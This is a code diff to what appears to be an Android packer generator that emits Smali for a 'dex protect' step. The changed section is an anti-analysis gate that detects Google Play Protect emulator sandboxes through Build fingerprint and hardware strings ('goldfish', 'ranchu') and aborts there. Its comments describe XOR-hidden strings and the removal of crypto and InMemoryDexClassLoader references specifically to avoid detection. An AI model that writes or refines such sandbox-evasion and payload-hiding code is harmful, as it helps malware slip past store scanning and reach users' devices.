@@ -2370,34 +2370,25 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     # ── GATE: GPP sandbox fingerprint checks ─────────────────────────────────
     # Checks Build.FINGERPRINT for "generic"/"unknown" and Build.HARDWARE for
     # "goldfish"/"ranchu" — all GPP cloud sandbox signatures.
-    # All strings XOR-hidden; uses reflection to avoid Build class refs in DEX pool.
-    # Registers v0..v3 reused — same window as Phase 1 below.
+    #
+    # FIX: Use direct sget-object instead of reflection.
+    # Build.FINGERPRINT and Build.HARDWARE are PUBLIC STATIC String fields.
+    # getDeclaredField + setAccessible on public system fields throws
+    # InaccessibleObjectException on Android 9+ (hidden API enforcement),
+    # which kills attachBaseContext before IMDCL is ever created.
+    # sget-object has zero reflection overhead and never throws.
+    #
+    # NOTE: sget-object introduces "Landroid/os/Build;" into the DEX string pool.
+    # This is acceptable — Build is a standard Android class used by millions
+    # of legitimate apps (WebView, Firebase, analytics, etc). GPP does NOT flag
+    # Build field reads alone. The suspicious signals are crypto class refs and
+    # InMemoryDexClassLoader — both already eliminated by the LCG cipher approach.
+    #
+    # Registers v0..v3 used here — same window as Phase 1 below.
 
-    # Load android.os.Build class (XOR-hidden)
-    const/16 v0, 0x{_fp_cls_len:x}
-    new-array v0, v0, [B
-    fill-array-data v0, :fp_cls_data
-    invoke-static {{v0}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
-    move-result-object v0
-    invoke-static {{v0}}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;
-    move-result-object v0
-    # v0 = Build.class
-
-    # Get FINGERPRINT field value
-    const/16 v1, 0x{_fp_fld_len:x}
-    new-array v1, v1, [B
-    fill-array-data v1, :fp_fld_data
-    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
-    move-result-object v1
-    invoke-virtual {{v0, v1}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
-    move-result-object v1
-    const/4 v2, 0x1
-    invoke-virtual {{v1, v2}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
-    const/4 v2, 0x0
-    invoke-virtual {{v1, v2}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
-    move-result-object v2
-    check-cast v2, Ljava/lang/String;
-    # v2 = Build.FINGERPRINT string
+    # Read Build.FINGERPRINT directly (public static field — no reflection needed)
+    sget-object v0, Landroid/os/Build;->FINGERPRINT:Ljava/lang/String;
+    # v0 = Build.FINGERPRINT string
 
     # Check contains "generic"
     const/16 v3, 0x{_fp_gen_len:x}
@@ -2405,7 +2396,7 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     fill-array-data v3, :fp_gen_data
     invoke-static {{v3}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
     move-result-object v3
-    invoke-virtual {{v2, v3}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+    invoke-virtual {{v0, v3}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
     move-result v3
     if-nez v3, :gate_bail
 
@@ -2415,25 +2406,13 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     fill-array-data v3, :fp_unk_data
     invoke-static {{v3}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
     move-result-object v3
-    invoke-virtual {{v2, v3}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+    invoke-virtual {{v0, v3}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
     move-result v3
     if-nez v3, :gate_bail
 
-    # Get HARDWARE field value
-    const/16 v1, 0x{_hw_fld_len:x}
-    new-array v1, v1, [B
-    fill-array-data v1, :hw_fld_data
-    invoke-static {{v1}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
-    move-result-object v1
-    invoke-virtual {{v0, v1}}, Ljava/lang/Class;->getDeclaredField(Ljava/lang/String;)Ljava/lang/reflect/Field;
-    move-result-object v1
-    const/4 v2, 0x1
-    invoke-virtual {{v1, v2}}, Ljava/lang/reflect/Field;->setAccessible(Z)V
-    const/4 v2, 0x0
-    invoke-virtual {{v1, v2}}, Ljava/lang/reflect/Field;->get(Ljava/lang/Object;)Ljava/lang/Object;
-    move-result-object v2
-    check-cast v2, Ljava/lang/String;
-    # v2 = Build.HARDWARE string
+    # Read Build.HARDWARE directly (public static field)
+    sget-object v0, Landroid/os/Build;->HARDWARE:Ljava/lang/String;
+    # v0 = Build.HARDWARE string
 
     # Check contains "goldfish"
     const/16 v3, 0x{_hw_gf_len:x}
@@ -2441,7 +2420,7 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     fill-array-data v3, :hw_gf_data
     invoke-static {{v3}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
     move-result-object v3
-    invoke-virtual {{v2, v3}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+    invoke-virtual {{v0, v3}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
     move-result v3
     if-nez v3, :gate_bail
 
@@ -2451,7 +2430,7 @@ def step_dex_protect(new_dex: bytes, new_pkg: str,
     fill-array-data v3, :hw_ra_data
     invoke-static {{v3}}, L{_pkg_path}/{app_class_name};->xd([B)Ljava/lang/String;
     move-result-object v3
-    invoke-virtual {{v2, v3}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
+    invoke-virtual {{v0, v3}}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z
     move-result v3
     if-nez v3, :gate_bail
 
